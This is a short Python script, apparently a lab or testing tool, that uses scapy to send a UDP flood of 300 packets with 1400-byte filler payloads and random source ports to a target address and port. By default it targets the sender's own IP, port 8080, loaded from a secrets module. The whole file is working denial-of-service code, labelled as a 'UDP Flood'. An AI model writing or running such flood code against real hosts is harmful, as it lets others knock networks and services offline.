from scapy.all import Ether, IP, UDP, Raw, sendp
import random
from secrets_loader import MY_IP, MY_MAC, MY_IFACE

def main(target_ip=MY_IP, target_port=8080, count=300):
    print(f"[+] Starting UDP Flood on {target_ip}:{target_port}")
    ether = Ether(src=MY_MAC, dst="ff:ff:ff:ff:ff:ff")
    for _ in range(count):
        ip = IP(dst=target_ip)
        udp = UDP(sport=random.randint(1024,65535), dport=target_port)
        payload = Raw(b"X" * 1400)  # Large payload
        pkt = ether / ip / udp / payload
        sendp(pkt, iface=MY_IFACE, verbose=False)
    print("[+] UDP Flood complete")

if __name__ == "__main__":
    main()
